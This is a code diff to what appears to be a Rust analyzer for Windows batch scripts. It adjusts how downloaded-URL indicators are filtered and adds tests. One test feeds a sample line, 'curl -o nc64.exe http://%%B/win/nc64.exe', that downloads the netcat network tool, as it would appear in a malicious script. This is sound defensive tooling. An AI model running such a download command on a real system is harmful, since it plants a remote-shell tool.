@@ -6287,11 +6287,10 @@ fn analyze_inner(
     // IOCs. win.bat (fb8bb3cf…) → 18× `http://%%B/…` URLs vanished
     // after this filter.
     env.traits.retain(|t| match t {
-        Trait::Download { src, .. } | Trait::DownloadInDeobText { src, .. } => {
-            !deob_scan::is_noise_url(src)
-        }
+        Trait::Download { src, .. } => !deob_scan::is_noise_structured_download_url(src),
+        Trait::DownloadInDeobText { src, .. } => !deob_scan::is_noise_url(src),
         Trait::CertutilDownload { url, .. } | Trait::BitsadminDownload { url, .. } => {
-            !deob_scan::is_noise_url(url)
+            !deob_scan::is_noise_structured_download_url(url)
         }
         Trait::UrlVariable { url, .. } => !deob_scan::is_noise_url(url),
         _ => true,
@@ -12190,6 +12189,54 @@ mod curl_tests {
         ));
         assert!(has, "traits: {:?}", env.traits);
         assert!(env.modified_filesystem.contains_key("out.exe"));
+    }
+
+    #[test]
+    fn curl_preserves_single_percent_variable_url_template() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(r#"curl -s "https://ipinfo.io/%IP_ADDRESS%/json""#, &mut env);
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. } if src == "https://ipinfo.io/%IP_ADDRESS%/json"
+            )),
+            "direct curl URL template was not preserved as a download: {:?}",
+            env.traits
+        );
+
+        let report = crate::analyze(
+            br#"set /p IP_ADDRESS=Enter:
+curl -s "https://ipinfo.io/%IP_ADDRESS%/json" > ipinfo.json
+"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. } if src == "https://ipinfo.io/%IP_ADDRESS%/json"
+            )),
+            "curl URL template was not preserved as a download: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+    }
+
+    #[test]
+    fn curl_filters_double_percent_loop_variable_url_template() {
+        let report = crate::analyze(
+            br#"curl -o nc64.exe http://%%B/win/nc64.exe
+"#,
+            &Config::default(),
+        );
+        assert!(
+            !report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. } if src == "http://%%B/win/nc64.exe"
+            )),
+            "double-percent loop URL leaked as a download: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
     }
 
     #[test]
